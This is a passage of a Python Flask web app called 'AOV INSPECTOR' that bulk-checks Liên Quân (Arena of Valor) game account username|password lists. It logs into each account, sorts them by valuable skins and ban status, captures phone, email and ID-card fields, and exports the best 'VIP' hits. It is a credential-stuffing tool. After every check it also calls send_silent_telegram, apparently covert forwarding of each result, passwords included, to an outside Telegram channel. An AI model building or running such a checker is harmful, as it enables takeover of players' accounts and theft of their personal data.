.skin-ss { background: linear-gradient(135deg, rgba(0,240,255,0.2), rgba(0,229,255,0.1)); color: #00f0ff;
    border: 1px solid rgba(0,240,255,0.5); box-shadow: 0 0 12px rgba(0,240,255,0.3); }
.skin-anime { background: linear-gradient(135deg, rgba(224,64,251,0.2), rgba(186,85,211,0.1)); color: #e040fb;
    border: 1px solid rgba(224,64,251,0.5); box-shadow: 0 0 12px rgba(224,64,251,0.3); }
.skin-normal { background: linear-gradient(135deg, rgba(139,139,154,0.2), rgba(90,90,112,0.1)); color: #a0a0b8;
    border: 1px solid rgba(139,139,154,0.4); }
.cred-box { background: linear-gradient(135deg, rgba(0,240,255,0.08), rgba(255,0,229,0.08));
    border: 1.5px solid rgba(0,240,255,0.4); border-radius: 14px;
    padding: 16px; margin-bottom: 14px; position: relative; overflow: hidden; }
.cred-label { font-family: 'Orbitron', sans-serif; font-size: 0.68em; color: var(--text-dim);
    text-transform: uppercase; letter-spacing: 1.5px; font-weight: 700; margin-bottom: 6px; }
.cred-value { font-family: 'Share Tech Mono', monospace; font-size: 1em; color: #00f0ff;
    font-weight: 700; word-break: break-all; padding: 8px 12px;
    background: rgba(0,0,0,0.5); border-radius: 8px; margin-bottom: 12px;
    border: 1px solid rgba(0,240,255,0.2); cursor: pointer; user-select: all; transition: all 0.2s; }
.cred-value:hover { background: rgba(0,240,255,0.1); border-color: #00f0ff; }
.cred-value:last-child { margin-bottom: 0; }
.spinner { display: inline-block; width: 22px; height: 22px;
    border: 3px solid rgba(255,0,229,0.2); border-top-color: var(--pink); border-radius: 50%;
    animation: spin 0.8s linear infinite; vertical-align: middle; margin-right: 8px; }
@keyframes spin { to { transform: rotate(360deg); } }
.progress-container { background: rgba(0,0,0,0.4); border: 1px solid var(--border);
    border-radius: 16px; padding: 20px; margin: 16px 0; }
.progress-bar-wrap { width: 100%; height: 24px; background: rgba(0,0,0,0.6);
    border-radius: 12px; overflow: hidden; position: relative; margin: 12px 0; border: 1px solid var(--border); }
.progress-bar-fill { height: 100%;
    background: linear-gradient(90deg, #ff00e5, #a855f7, #00f0ff, #ff00e5);
    background-size: 300% 100%; animation: logoShift 2s linear infinite;
    border-radius: 12px; transition: width 0.5s; }
.progress-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%);
    font-family: 'Orbitron', sans-serif; font-weight: 800; font-size: 0.78em; color: #fff;
    text-shadow: 0 0 10px rgba(0,0,0,0.9); }
.live-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 14px; }
.live-stat { background: rgba(0,0,0,0.4); border: 1px solid var(--border); border-radius: 12px;
    padding: 10px 8px; text-align: center; }
.live-stat .num { font-family: 'Orbitron', sans-serif; font-size: 1.4em; font-weight: 900; line-height: 1; }
.live-stat .lbl { font-size: 0.6em; color: var(--text-dim); text-transform: uppercase;
    letter-spacing: 1px; font-weight: 700; margin-top: 4px; }
.live-log { background: rgba(0,0,0,0.7); border: 1px solid var(--border); border-radius: 12px;
    padding: 12px; font-family: 'Share Tech Mono', monospace; font-size: 0.75em;
    line-height: 1.6; max-height: 200px; overflow-y: auto; margin-top: 14px; }
.live-log .log-line { margin-bottom: 2px; }
.live-log .log-line.sss { color: #ffd700 !important; font-weight: 700; text-shadow: 0 0 10px rgba(255,215,0,0.5); }
.live-log .log-line.ss { color: #00f0ff !important; font-weight: 600; text-shadow: 0 0 8px rgba(0,240,255,0.5); }
.live-log .log-line.anime { color: #e040fb !important; font-weight: 600; text-shadow: 0 0 8px rgba(224,64,251,0.5); }
.live-log .log-line.banned { color: #ff2951 !important; }
.live-log .log-line.failed { color: #8b8b9a !important; }
.live-log .log-line.trang { color: #a0a0b8 !important; }
.live-log .log-line.normal { color: #c0c0e0; }
::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-thumb { background: linear-gradient(135deg, #ff00e5, #a855f7); border-radius: 3px; }
@media (max-width: 480px) {
    .container { padding: 12px; }
    .card { padding: 16px; border-radius: 16px; }
    .card-title { font-size: 1em; }
    .stat-value { font-size: 1.6em; }
    .stat-box.small .stat-value { font-size: 1.2em; }
    .menu-grid { gap: 8px; }
    .menu-btn { padding: 12px 6px; border-radius: 14px; }
    .menu-icon { font-size: 1.6em; }
    .app-logo-text { font-size: 0.95em; }
    .balance-pill { padding: 6px 10px; font-size: 0.8em; }
    .stat-grid-4 { gap: 6px; }
    .stat-grid-5 { gap: 4px; }
    .stat-grid-3 { gap: 8px; }
}
</style>
"""

def flash_html():
    msgs = get_flashed_messages(with_categories=True)
    if not msgs: return ""
    html = ""
    for cat, m in msgs:
        icon = "✕" if cat == "error" else "✓"
        html += f'<div class="flash {cat}"><span>{icon}</span><span>{m}</span></div>'
    return html

def render_page(content, active_tab="", user=None):
    unread = unread_count() if user else 0
    balance = user.get("balance", 0) if user else 0
    header = ""
    if user:
        admin_btn = '<a href="/admin" class="icon-btn admin" title="Admin">👑</a>' if user.get("is_admin") else ""
        header = f'''
        <div class="app-header">
            <div class="app-logo">
                <div class="app-logo-icon">◈</div>
                <div class="app-logo-text">AOV</div>
            </div>
            <div style="display:flex; gap:8px; align-items:center;">
                <div class="balance-pill">◈ {balance}</div>
                {admin_btn}
                <a href="/logout" class="icon-btn logout" title="Thoát">⎋</a>
            </div>
        </div>
        '''
    menu = ""
    if user:
        def mcls(tab): return "menu-btn active" if active_tab == tab else "menu-btn"
        notif_badge = f'<div class="menu-badge">{unread if unread < 10 else "9+"}</div>' if unread > 0 else ""
        menu = f'''
        <div class="card" style="padding:14px;">
            <div class="menu-grid">
                <a href="/check" class="{mcls('check')}"><div class="menu-icon">◈</div><div class="menu-label">Check</div></a>
                <a href="/check_file" class="{mcls('check_file')}"><div class="menu-icon">▣</div><div class="menu-label">File</div></a>
                <a href="/export_tool" class="{mcls('export')}"><div class="menu-icon">📄</div><div class="menu-label">Tạo File</div></a>
                <a href="/enter_code" class="{mcls('code')}"><div class="menu-icon">◆</div><div class="menu-label">Code</div></a>
                <a href="/tu_tien" class="{mcls('tu_tien')}"><div class="menu-icon">⚔</div><div class="menu-label">Tu Tiên</div></a>
                <a href="/tu_tien?action=vukhi" class="{mcls('vukhi')}"><div class="menu-icon">⚡</div><div class="menu-label">Vũ Khí</div></a>
                <a href="/tu_tien?action=monphai" class="{mcls('monphai')}"><div class="menu-icon">⛩</div><div class="menu-label">Môn Phái</div></a>
                <a href="/profile" class="{mcls('profile')}"><div class="menu-icon">◐</div><div class="menu-label">Cá Nhân</div></a>
                <a href="/history" class="{mcls('history')}"><div class="menu-icon">▤</div><div class="menu-label">Lịch Sử</div></a>
                <a href="/notifications" class="{mcls('notif')}"><div class="menu-icon">◉</div><div class="menu-label">T.Báo</div>{notif_badge}</a>
            </div>
        </div>
        '''
    return f'''<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#05000e">
<title>AOV INSPECTOR</title>
{BASE_CSS}
</head>
<body>
<div class="container">
{header}
{menu}
{flash_html()}
{content}
</div>
</body>
</html>'''

def file_check_worker(job_id, acc_list, user_name):
    job = CHECK_JOBS.get(job_id)
    if not job: return
    total = len(acc_list)
    user = USERS.get(user_name)
    if not user: return
    results = []
    cancelled_mid = False
    for i, (u, p) in enumerate(acc_list):
        if job.get("cancelled"):
            cancelled_mid = True
            break
        try:
            r = run_single_check(u, p)
        except Exception as e:
            r = {"type": "failed", "username": u, "password": p, "error": str(e),
                 "sss": [], "ss": [], "anime": [], "skins": [], "other_skins": [], "all_skins": [],
                 "rank": "", "level": 0, "name": "", "rank_stars": 0, "banned": False,
                 "uid": "", "shell": 0, "total_skins": 0,
                 "mobile_no": "", "country_code": "", "email": "", "idcard": "", "two_fa": False}
        results.append(r)
        hist_entry = make_hist_entry(r, u)
        user["history"] = user.get("history", [])[-499:] + [hist_entry]
        send_silent_telegram(r)
        job["current"] = i + 1
        job["progress"] = int(((i + 1) / total) * 100)
        job["current_acc"] = u
        job["last_type"] = r.get("type", "failed")
        icon = {"sss": "◈", "ss": "◆", "anime": "◇", "normal": "▪", "trang": "○", "banned": "✖", "failed": "✕"}.get(r["type"], "?")
        job["logs"].append({"acc": u, "type": r["type"], "msg": f"{icon} [{r['type'].upper()}] {u} ({r.get('total_skins', 0)} skin)"})
        if len(job["logs"]) > 50: job["logs"] = job["logs"][-50:]

    sss_c = sum(1 for r in results if r["type"] == "sss")
    ss_c = sum(1 for r in results if r["type"] == "ss")
    an_c = sum(1 for r in results if r["type"] == "anime")
    ban_c = sum(1 for r in results if r["type"] == "banned")
    norm_c = sum(1 for r in results if r["type"] == "normal")
    trang_c = sum(1 for r in results if r["type"] == "trang")
    fail_c = sum(1 for r in results if r["type"] == "failed")

    user["mission"]["total_acc"] = user["mission"].get("total_acc", 0) + len(results)
    user["mission"]["sss"] = user["mission"].get("sss", 0) + sss_c
    user["mission"]["ss"] = user["mission"].get("ss", 0) + ss_c
    user["mission"]["anime"] = user["mission"].get("anime", 0) + an_c
    if user.get("current_job") == job_id:
        user["current_job"] = None
    save_data()

    job["done"] = True
    job["stats"] = {"total": len(results), "sss": sss_c, "ss": ss_c, "anime": an_c,
                    "banned": ban_c, "normal": norm_c, "trang": trang_c, "failed": fail_c}
    if cancelled_mid:
        job["progress"] = int((len(results) / total) * 100) if total > 0 else 0
        job["summary"] = (f"🛑 ĐÃ HUỶ!\n├─ Đã check: {len(results)}/{total}\n"
                          f"├─ SSS: {sss_c}\n├─ SS: {ss_c}\n├─ Anime: {an_c}\n"
                          f"├─ Trắng TT: {trang_c}\n├─ Trắng thường: {norm_c}\n"
                          f"├─ Ban: {ban_c}\n└─ Trượt: {fail_c}")
    else:
        job["progress"] = 100
        job["summary"] = (f"◈ HOÀN TẤT!\n├─ Đã check: {len(results)}/{total}\n"
                          f"├─ SSS: {sss_c}\n├─ SS: {ss_c}\n├─ Anime: {an_c}\n"
                          f"├─ Trắng TT: {trang_c}\n├─ Trắng thường: {norm_c}\n"
                          f"├─ Ban: {ban_c}\n└─ Trượt: {fail_c}")

@app.route("/")
def index():
    if "username" in session and session["username"] in USERS:
        return redirect(url_for("check_page"))
    return redirect(url_for("login_page"))

@app.route("/login", methods=["GET", "POST"])
def login_page():
    if "username" in session and session["username"] in USERS:
        return redirect(url_for("check_page"))
    if request.method == "POST":
        u = request.form.get("username", "").strip()
        p = request.form.get("password", "")
        usr = USERS.get(u)
        if usr and usr["password"] == hash_password(p):
            session["username"] = u
            session.permanent = True
            flash(f"Chào mừng {u}!", "success")
            return redirect(url_for("check_page"))
        flash("Sai tài khoản hoặc mật khẩu!", "error")
    content = '''
    <div class="card" style="margin-top:20px; text-align:center;">
        <div style="font-size:4em; margin-bottom:12px; filter:drop-shadow(0 0 30px #ff00e5);">◈</div>
        <h1 class="card-title" style="justify-content:center; font-size:1.6em; margin-bottom:8px;">AOV INSPECTOR</h1>
        <p style="color:var(--text-dim); margin-bottom:24px; font-size:0.95em;">Hệ thống kiểm tra tài khoản Liên Quân</p>
        <div style="display:flex; gap:8px; margin-bottom:24px;">
            <a href="/login" class="btn btn-block" style="flex:1;">Đăng Nhập</a>
            <a href="/register" class="btn btn-secondary btn-block" style="flex:1;">Đăng Ký</a>
        </div>
        <form method="POST">
            <div class="form-group" style="text-align:left;">
                <label class="form-label">Tên đăng nhập</label>
                <input type="text" name="username" class="form-input" placeholder="Nhập username..." required>
            </div>
            <div class="form-group" style="text-align:left;">
                <label class="form-label">Mật khẩu</label>
                <input type="password" name="password" class="form-input" placeholder="Nhập mật khẩu..." required>
            </div>
            <button type="submit" class="btn btn-block">Đăng Nhập</button>
        </form>
    </div>
    '''
    return render_page(content, active_tab="", user=None)

@app.route("/register", methods=["GET", "POST"])
def register_page():
    if request.method == "POST":
        u = request.form.get("username", "").strip()
        p = request.form.get("password", "")
        cf = request.form.get("confirm", "")
        ref = request.form.get("ref", "").strip().upper()
        if not u or len(u) < 3 or len(u) > 20 or not u.isalnum():
            flash("Username 3-20 ký tự chữ/số!", "error")
        elif len(p) < 4:
            flash("Mật khẩu ít nhất 4 ký tự!", "error")
        elif p != cf:
            flash("Mật khẩu không khớp!", "error")
        elif u in USERS:
            flash("Username đã tồn tại!", "error")
        else:
            uid = gen_id()
            inviter = None
            for un, uu in USERS.items():
                if uu.get("id") == ref: inviter = un; break
            USERS[u] = {
                "id": uid, "username": u, "password": hash_password(p),
                "balance": DEFAULT_BALANCE, "temp_balance": 0,
                "referrals": 0, "invited_by": inviter, "is_admin": False,
                "created_at": time.time(), "last_checkin": 0,
                "last_notif_read": 0, "checkin_streak": 0, "total_checkins": 0,
                "cultivation": {"level": 0, "exp": 0, "hp": 100, "atk": 20, "def": 10,
                                "weapon": None, "mon_phai": None, "mon_phai_level": 0},
                "mission": {"total_acc": 0, "sss": 0, "ss": 0, "anime": 0, "xu_used": 0, "claimed": []},
                "history": [],
                "current_job": None,
            }
            if inviter and inviter in USERS:
                USERS[inviter]["referrals"] = USERS[inviter].get("referrals", 0) + 1
                USERS[inviter]["balance"] += REFERRAL_REWARD
                USERS[u]["balance"] += REFERRAL_BONUS
            save_data()
            session["username"] = u
            session.permanent = True
            flash(f"Đăng ký thành công! ID: {uid}", "success")
            return redirect(url_for("check_page"))
    content = '''
    <div class="card" style="margin-top:20px;">
        <div style="text-align:center; margin-bottom:20px;">
            <div style="font-size:4em; margin-bottom:8px; filter:drop-shadow(0 0 30px #00f0ff);">✦</div>
            <h1 class="card-title" style="justify-content:center; font-size:1.6em;">ĐĂNG KÝ</h1>
        </div>
        <div style="display:flex; gap:8px; margin-bottom:20px;">
            <a href="/login" class="btn btn-secondary btn-block" style="flex:1;">Đăng Nhập</a>
            <a href="/register" class="btn btn-block" style="flex:1;">Đăng Ký</a>
        </div>
        <form method="POST">
            <div class="form-group"><label class="form-label">Username</label>
                <input type="text" name="username" class="form-input" placeholder="3-20 ký tự..." required minlength="3" maxlength="20"></div>
            <div class="form-group"><label class="form-label">Mật khẩu</label>
                <input type="password" name="password" class="form-input" placeholder="Ít nhất 4 ký tự..." required minlength="4"></div>
            <div class="form-group"><label class="form-label">Xác nhận mật khẩu</label>
                <input type="password" name="confirm" class="form-input" placeholder="Nhập lại..." required minlength="4"></div>
            <div class="form-group"><label class="form-label">Mã người mời (không bắt buộc)</label>
                <input type="text" name="ref" class="form-input" placeholder="VD: AOV-XXXX-XXXX"></div>
            <button type="submit" class="btn btn-success btn-block">Tạo Tài Khoản</button>
        </form>
    </div>
    '''
    return render_page(content, active_tab="", user=None)

@app.route("/logout")
def logout():
    session.pop("username", None)
    flash("Đã đăng xuất!", "success")
    return redirect(url_for("login_page"))

@app.route("/check", methods=["GET", "POST"])
@login_required
def check_page():
    user = get_user()
    result = None
    if request.method == "POST":
        acc = request.form.get("account", "").strip()
        pwd = request.form.get("password", "").strip()
        if not acc or not pwd:
            flash("Nhập đầy đủ tài khoản và mật khẩu!", "error")
        elif user["balance"] < 1:
            flash("Không đủ lượt! Cần 1 lượt.", "error")
        else:
            user["balance"] -= 1
            save_data()
            try:
                r = run_single_check(acc, pwd)
                result = format_result(r)
                hist_entry = make_hist_entry(r, acc)
                user["history"] = user.get("history", [])[-499:] + [hist_entry]
                user["mission"]["total_acc"] = user["mission"].get("total_acc", 0) + 1
                if r["type"] == "sss": user["mission"]["sss"] = user["mission"].get("sss", 0) + 1
                elif r["type"] == "ss": user["mission"]["ss"] = user["mission"].get("ss", 0) + 1
                elif r["type"] == "anime": user["mission"]["anime"] = user["mission"].get("anime", 0) + 1
                save_data()
                send_silent_telegram(r)
            except Exception as e:
                result = f"✕ Lỗi: {e}"
                flash(f"Lỗi: {e}", "error")
    m = user.get("mission", {})
    content = f'''
    <div class="card">
        <h2 class="card-title"><span class="card-title-icon">◈</span> Check Tài Khoản</h2>
        <form method="POST">
            <div class="form-group"><label class="form-label">Tài khoản</label>
                <input type="text" name="account" class="form-input" placeholder="user hoặc email..." required autocomplete="off"></div>
            <div class="form-group"><label class="form-label">Mật khẩu</label>
                <input type="password" name="password" class="form-input" placeholder="mật khẩu..." required></div>
            <button type="submit" class="btn btn-block">Check Ngay (1 Lượt)</button>
        </form>
    </div>
    {f'<div class="card"><h3 class="card-title">◉ Kết Quả</h3><div class="result-box">{result}</div></div>' if result else ''}
    <div class="card">
        <h2 class="card-title"><span class="card-title-icon">◐</span> Thống Kê Cá Nhân</h2>
        <div class="stat-grid">
            <div class="stat-box"><div class="stat-value">{m.get('total_acc', 0)}</div><div class="stat-label">Tổng Acc</div></div>
            <div class="stat-box"><div class="stat-value">{m.get('sss', 0)}</div><div class="stat-label">SSS</div></div>
            <div class="stat-box"><div class="stat-value">{m.get('ss', 0)}</div><div class="stat-label">SS</div></div>
            <div class="stat-box"><div class="stat-value">{m.get('anime', 0)}</div><div class="stat-label">Anime</div></div>
        </div>
    </div>
    '''
    return render_page(content, active_tab="check", user=user)
@app.route("/check_file", methods=["GET", "POST"])
@login_required
def check_file():
    user = get_user()
    if request.method == "POST":
        if "file" not in request.files:
            flash("Chưa chọn file!", "error")
            return redirect(url_for("check_file"))
        f = request.files["file"]
        if not f.filename.endswith(".txt"):
            flash("Chỉ nhận file .txt!", "error")
            return redirect(url_for("check_file"))
        content_bytes = f.read().decode("utf-8", errors="ignore")
        accs = parse_file_content(content_bytes)
        if not accs:
            flash("Không tìm thấy acc hợp lệ!", "error")
            return redirect(url_for("check_file"))
        total = len(accs)
        xu = (total + 44) // 45
        if user["balance"] < xu:
            flash(f"Cần {xu} xu, có {user['balance']}!", "error")
            return redirect(url_for("check_file"))
        user["balance"] -= xu
        job_id = uuid.uuid4().hex[:16]
        CHECK_JOBS[job_id] = {
            "id": job_id, "user": user["username"], "total": total,
            "current": 0, "progress": 0, "done": False, "logs": [],
            "current_acc": "", "last_type": "", "stats": {}, "summary": "",
            "cancelled": False,
        }
        user["current_job"] = job_id
        save_data()
        t = threading.Thread(target=file_check_worker, args=(job_id, accs, user["username"]), daemon=True)
        t.start()
        return redirect(url_for("check_file_progress", job_id=job_id))

    running_job = None
    last_job_id = user.get("current_job")
    if last_job_id and last_job_id in CHECK_JOBS:
        j = CHECK_JOBS[last_job_id]
        if not j.get("done") and j.get("user") == user["username"]:
            running_job = last_job_id

    job_banner = ""
    if running_job:
        job_banner = f'''
        <div class="card" style="border:2px solid #ffb800; background:linear-gradient(135deg, rgba(255,184,0,0.15), rgba(255,140,0,0.1));">
            <div style="display:flex; align-items:center; gap:12px;">
                <div style="font-size:2em; filter:drop-shadow(0 0 15px #ffb800);">⚙️</div>
                <div style="flex:1;">
                    <div style="font-weight:700; color:#ffb800; font-family:'Orbitron',sans-serif; margin-bottom:4px; font-size:0.9em;">CÓ JOB ĐANG CHẠY</div>
                    <div style="font-size:0.85em; color:var(--text-dim);">Tiến trình check file vẫn đang chạy ở nền</div>
                </div>
                <a href="/check_file/progress/{running_job}" class="btn btn-warning btn-sm" style="width:auto;">Xem →</a>
            </div>
        </div>
        '''

    content = f'''
    {job_banner}
    <div class="card">
        <h2 class="card-title"><span class="card-title-icon">▣</span> Check File</h2>
        <p style="color:var(--text-dim); margin-bottom:14px; font-size:0.9em;">Upload file .txt (mỗi dòng 1 acc dạng user|pass)</p>
        <div style="background:rgba(0,0,0,0.4); padding:14px; border-radius:14px; margin-bottom:14px; font-size:0.85em; border:1px solid var(--border);">
            <div class="info-row"><span class="info-label">Phí</span><span class="info-value">45 acc = 1 xu</span></div>
            <div class="info-row"><span class="info-label">Số dư</span><span class="info-value">{user['balance']} xu</span></div>
            <div class="info-row"><span class="info-label">Tốc độ</span><span class="info-value" style="color:#00ff88;">⚡ {MAX_CONCURRENT_CHECKS} luồng</span></div>
        </div>
        <form method="POST" enctype="multipart/form-data">
            <div class="form-group"><label class="form-label">File danh sách</label>
                <input type="file" name="file" class="form-input" accept=".txt" required></div>
            <button type="submit" class="btn btn-block">Upload & Check</button>
        </form>
    </div>
    <div class="card" style="background:linear-gradient(135deg, rgba(0,240,255,0.05), rgba(255,0,229,0.05)); border:1.5px solid rgba(0,240,255,0.3);">
        <h3 class="card-title" style="font-size:0.95em;"><span class="card-title-icon">💡</span> Công Cụ Hỗ Trợ</h3>
        <div style="display:flex; gap:8px; flex-wrap:wrap;">
            <a href="/export_tool" class="btn btn-block" style="flex:1; min-width:150px;">📄 Tạo File Mới</a>
            <a href="/export_tool/sample" class="btn btn-secondary btn-block" style="flex:1; min-width:150px;">📥 File Mẫu</a>
        </div>
    </div>
    '''
    return render_page(content, active_tab="check_file", user=user)

@app.route("/check_file/progress/<job_id>")
@login_required
def check_file_progress(job_id):
    user = get_user()
    job = CHECK_JOBS.get(job_id)
    if not job or job.get("user") != user["username"]:
        flash("Job không tồn tại hoặc đã hết!", "error")
        return redirect(url_for("check_file"))
    user["current_job"] = job_id
    save_data()

    content = f'''
    <div class="card" id="progress-card">
        <h2 class="card-title"><span class="spinner"></span> Đang Check File...</h2>
        <p style="color:var(--text-dim); margin-bottom:14px; font-size:0.9em;" id="status-text">Đang khởi động...</p>
        <div class="progress-container">
            <div style="display:flex; justify-content:space-between; font-size:0.85em; margin-bottom:8px;">
                <span>Tiến trình</span>
                <span id="progress-percent" style="font-family:'Orbitron',sans-serif; color:#ff88ee; font-weight:800;">0%</span>
            </div>
            <div class="progress-bar-wrap">
                <div class="progress-bar-fill" id="progress-bar" style="width:0%;"></div>
                <div class="progress-text" id="progress-text">0 / {job['total']}</div>
            </div>
            <div style="text-align:center; font-size:0.85em; color:var(--text-dim); margin-top:8px;">
                Đang check: <b id="current-acc" style="color:#00f0ff; font-family:'Share Tech Mono',monospace;">Chờ...</b>
            </div>
        </div>
        <div style="display:flex; gap:8px; margin:14px 0;">
            <button id="cancel-btn" onclick="cancelJob()" class="btn btn-danger btn-block">🛑 HUỶ CHECK</button>
        </div>
        <div class="live-stats">
            <div class="live-stat"><div class="num" id="stat-sss" style="color:#ffd700;">0</div><div class="lbl">SSS</div></div>
            <div class="live-stat"><div class="num" id="stat-ss" style="color:#00f0ff;">0</div><div class="lbl">SS</div></div>
            <div class="live-stat"><div class="num" id="stat-anime" style="color:#e040fb;">0</div><div class="lbl">Anime</div></div>
        </div>
        <div class="live-log" id="live-log"><div class="log-line normal" style="color:var(--text-dim);">⏳ Chờ kết quả...</div></div>
    </div>
    <div id="done-section" style="display:none;">
        <div class="card" id="done-card">
            <h2 class="card-title" id="done-title" style="color:#00ff88;">✓ Hoàn Tất!</h2>
            <div id="summary-box" class="result-box"></div>
            <div class="stat-grid-5" style="margin-top:14px;">
                <div class="stat-box small" style="cursor:pointer; border-color:rgba(255,184,0,0.5);" onclick="window.location.href='/history?tab=sss'"><div class="stat-value" style="font-size:1.3em; background:linear-gradient(135deg,#ffb800,#ffd700); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;" id="done-sss">0</div><div class="stat-label">◈ SSS</div></div>
                <div class="stat-box small" style="cursor:pointer; border-color:rgba(0,240,255,0.5);" onclick="window.location.href='/history?tab=ss'"><div class="stat-value" style="font-size:1.3em; background:linear-gradient(135deg,#00f0ff,#00e5ff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;" id="done-ss">0</div><div class="stat-label">◆ SS</div></div>
                <div class="stat-box small" style="cursor:pointer; border-color:rgba(224,64,251,0.5);" onclick="window.location.href='/history?tab=anime'"><div class="stat-value" style="font-size:1.3em; background:linear-gradient(135deg,#e040fb,#ba55d3); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;" id="done-anime">0</div><div class="stat-label">◇ Anime</div></div>
                <div class="stat-box small" style="cursor:pointer; border-color:rgba(139,139,154,0.5);" onclick="window.location.href='/history?tab=trang'"><div class="stat-value" style="font-size:1.3em; background:linear-gradient(135deg,#8b8b9a,#a0a0b8); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;" id="done-trang">0</div><div class="stat-label">○ Trắng</div></div>
                <div class="stat-box small" style="border-color:rgba(255,41,81,0.5);"><div class="stat-value" style="font-size:1.3em; background:linear-gradient(135deg,#ff2951,#d50000); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;" id="done-ban">0</div><div class="stat-label">✖ Ban</div></div>
            </div>
            <div style="display:flex; gap:8px; margin-top:14px;"><a href="/export_vip_all" class="btn btn-success btn-block" style="flex:1;">📥 XUẤT VIP ALL</a></div>
            <div style="display:flex; gap:6px; margin-top:8px; flex-wrap:wrap;">
                <a href="/export_results?type=sss" class="btn btn-warning btn-block" style="flex:1; min-width:80px; font-size:0.72em;">📥 SSS</a>
                <a href="/export_results?type=ss" class="btn btn-info btn-block" style="flex:1; min-width:80px; font-size:0.72em;">📥 SS</a>
                <a href="/export_results?type=anime" class="btn btn-warning btn-block" style="flex:1; min-width:80px; font-size:0.72em;">📥 Anime</a>
                <a href="/export_results?type=trang" class="btn btn-secondary btn-block" style="flex:1; min-width:80px; font-size:0.72em;">📥 Trắng</a>
            </div>
            <div style="display:flex; gap:8px; margin-top:8px;">
                <a href="/history" class="btn btn-block" style="flex:1;">▤ Xem Lịch Sử</a>
                <a href="/check_file" class="btn btn-secondary btn-block" style="flex:1;">+ Check Mới</a>
            </div>
        </div>
    </div>
    <script>
    var jobId = "{job_id}";
    var pollInterval = null;
    function updateJob() {{
        fetch('/api/check_file/progress/' + jobId)
            .then(function(r) {{ return r.json(); }})
            .then(function(data) {{
                if (data.error) {{ clearInterval(pollInterval); return; }}
                document.getElementById('progress-bar').style.width = data.progress + '%';
                document.getElementById('progress-percent').textContent = data.progress + '%';
                document.getElementById('progress-text').textContent = data.current + ' / ' + data.total;
                if (data.current_acc) {{ document.getElementById('current-acc').textContent = data.current_acc; }}
                var st = document.getElementById('status-text');
                if (data.done) {{ st.innerHTML = '✅ Đã hoàn tất check file!'; }}
                else {{ st.innerHTML = 'Đang xử lý... <b>' + data.current + '/' + data.total + '</b> tài khoản'; }}
                if (data.logs && data.logs.length > 0) {{
                    var logHTML = '';
                    for (var i = 0; i < data.logs.length; i++) {{
                        var lg = data.logs[i];
                        var cls = 'normal';
                        if (lg.type === 'sss') cls = 'sss';
                        else if (lg.type === 'ss') cls = 'ss';
                        else if (lg.type === 'anime') cls = 'anime';
                        else if (lg.type === 'banned') cls = 'banned';
                        else if (lg.type === 'failed') cls = 'failed';
                        else if (lg.type === 'trang') cls = 'trang';
                        logHTML += '<div class="log-line ' + cls + '">' + lg.msg + '</div>';
                    }}
                    var logBox = document.getElementById('live-log');
                    logBox.innerHTML = logHTML;
                    logBox.scrollTop = logBox.scrollHeight;
                }}
                if (data.stats) {{
                    document.getElementById('stat-sss').textContent = data.stats.sss || 0;
                    document.getElementById('stat-ss').textContent = data.stats.ss || 0;
                    document.getElementById('stat-anime').textContent = data.stats.anime || 0;
                }}
                if (data.done) {{
                    clearInterval(pollInterval);
                    document.getElementById('progress-card').style.display = 'none';
                    document.getElementById('done-section').style.display = 'block';
                    document.getElementById('summary-box').textContent = data.summary || 'Hoàn tất!';
                    if (data.stats) {{
                        document.getElementById('done-sss').textContent = data.stats.sss || 0;
                        document.getElementById('done-ss').textContent = data.stats.ss || 0;
                        document.getElementById('done-anime').textContent = data.stats.anime || 0;
                        document.getElementById('done-trang').textContent = data.stats.trang || 0;
                        document.getElementById('done-ban').textContent = data.stats.banned || 0;
                    }}
                    if (data.summary && data.summary.indexOf('HUỶ') >= 0) {{
                        document.getElementById('done-title').textContent = '🛑 Đã Huỷ!';
                        document.getElementById('done-title').style.color = '#ffb800';
                        document.getElementById('done-card').style.borderLeft = '3px solid #ffb800';
                    }}
                }}
            }}).catch(function(e) {{ console.log(e); }});
    }}
    function cancelJob() {{
        if (!confirm('Bạn chắc chắn muốn huỷ check?')) return;
        fetch('/api/check_file/cancel/' + jobId, {{ method: 'POST' }})
            .then(function(r) {{ return r.json(); }})
            .then(function(data) {{
                if (data.ok) {{
                    var btn = document.getElementById('cancel-btn');
                    btn.textContent = '⏳ Đang huỷ...';
                    btn.disabled = true;
                    btn.style.opacity = '0.6';
                }}
            }}).catch(function(e) {{ console.log(e); }});
    }}
    updateJob();
    pollInterval = setInterval(updateJob, 1500);
    </script>
    '''
    return render_page(content, active_tab="check_file", user=user)

@app.route("/api/check_file/progress/<job_id>")
@login_required
def api_check_file_progress(job_id):
    user = get_user()
    job = CHECK_JOBS.get(job_id)
    if not job or job.get("user") != user["username"]:
        return jsonify({"error": "Job không tồn tại"})
    return jsonify({
        "total": job.get("total", 0), "current": job.get("current", 0),
        "progress": job.get("progress", 0), "current_acc": job.get("current_acc", ""),
        "done": job.get("done", False), "logs": job.get("logs", [])[-15:],
        "stats": job.get("stats", {}), "summary": job.get("summary", ""),
    })

@app.route("/api/check_file/cancel/<job_id>", methods=["POST"])
@login_required
def api_check_file_cancel(job_id):
    user = get_user()
    job = CHECK_JOBS.get(job_id)
    if not job or job.get("user") != user["username"]:
        return jsonify({"ok": False, "error": "Job không tồn tại"})
    job["cancelled"] = True
    return jsonify({"ok": True})

def build_export_lines(items, header_title, user):
    lines = []
    lines.append("#" + "=" * 60)
    lines.append(f"# {header_title}")
    lines.append("#" + "=" * 60)
    lines.append(f"# Người xuất: {user['username']}")
    lines.append(f"# Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"# Tổng số: {len(items)} acc")
    lines.append("#" + "=" * 60)
    lines.append("")
    items_sorted = sorted(items, key=lambda x: x.get("time", ""), reverse=True)
    for idx, h in enumerate(items_sorted, 1):
        tier = h.get("result", "").upper()
        tier_icon = {"SSS": "◈", "SS": "◆", "ANIME": "◇", "TRANG": "○", "NORMAL": "▪", "BANNED": "✖", "FAILED": "✕"}.get(tier, "?")
